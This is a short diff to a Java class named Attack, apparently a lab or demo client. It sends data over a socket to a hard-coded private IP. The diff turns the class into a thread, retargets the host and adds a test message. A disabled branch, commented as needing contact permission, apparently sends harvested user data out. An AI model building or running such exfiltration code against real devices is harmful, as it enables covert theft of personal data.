@@ -4,17 +4,20 @@ import java.io.IOException;
 import java.io.OutputStream;
 import java.io.PrintStream;
 import java.net.Socket;
-import java.sql.Time;
 import java.util.UUID;
 
-public class Attack {
+public class Attack extends Thread {
     private final int port = 6789;
-    private final String host = "192.168.0.1";
+    private final String host = "192.168.222.2";
     private final UUID uuid = UUID.randomUUID();
+
 
     public void performAttack(){
         String data;
         String haeder;
+
+        String testData = "Client: " + uuid + " wants to be attacked!";
+        sendData(testData);
 
         if (false/*ContactPermission is given*/){
             haeder = "uuid: " + uuid + "\n" +
@@ -35,6 +38,8 @@ public class Attack {
 
             sendData(haeder + "\n\n" + data);
         }
+
+
     }
 
     private void sendData(String data){
@@ -59,8 +64,8 @@ public class Attack {
         return null;
     }
 
-
-
-
-
+    @Override
+    public void run() {
+        performAttack();
+    }
 }
